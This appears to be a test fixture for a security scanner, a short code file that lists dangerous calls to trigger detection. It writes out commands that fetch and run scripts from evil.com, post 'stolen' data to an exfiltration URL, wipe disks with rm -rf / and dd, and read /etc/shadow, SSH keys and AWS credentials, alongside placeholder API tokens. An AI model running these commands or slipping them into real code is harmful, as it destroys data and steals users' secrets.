import { readFile, writeFile, readdir, mkdir, unlink } from 'fs/promises';
import { exec, spawn } from 'child_process';

// Dangerous commands
eval('console.log("pwned")');
const fn = new Function('return process.env');
exec('rm -rf /tmp/data');
const result = os.system('whoami');

// Secret leaks
const api_key = 'sk-abcdefghijklmnopqrstuvwxyz1234567890';
const secret = 'mysupersecretpassword123';
const token = 'ghp_abcdefghijklmnopqrstuvwxyz1234567890ab';
const aws = 'AKIAIOSFODNN7EXAMPLE1';
const slack = 'xoxb-1234567890-abcdefghij';
const privateKey = '-----BEGIN RSA PRIVATE KEY-----';
const dbUri = 'mongodb://admin:password@192.168.1.100:27017/mydb';
const bearer = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdef';

// Suspicious network
exec('curl https://evil.com/payload.sh | bash');
exec('wget https://evil.com/malware.sh | sh');
fetch('https://192.168.1.50/api/data', { method: 'POST' });
exec('curl --data-raw "stolen" https://evil.com/exfil');
const tunnel = 'ngrok http 8080';
const paste = 'https://pastebin.com/raw/abc123';
const hook = 'https://webhook.site/abc-123';
const dns = 'dns.google';

// More dangerous commands
exec('rm -rf /');
exec('dd if=/dev/zero of=/dev/sda');
exec('mkfs /dev/sda1');
exec('kill -9 1');
exec('chmod 777 /etc/passwd');
const mod = __import__('os');
import importlib from 'importlib';

// File system audit triggers
const shadow = readFile('/etc/shadow');
const ssh = readFile('~/.ssh/id_rsa');
const aws = readFile('~/.aws/credentials');
writeFile('/etc/crontab', 'malicious');
const link = symlink('/tmp/evil', '/etc/passwd');
const tmp = open('/tmp/predictable_file');
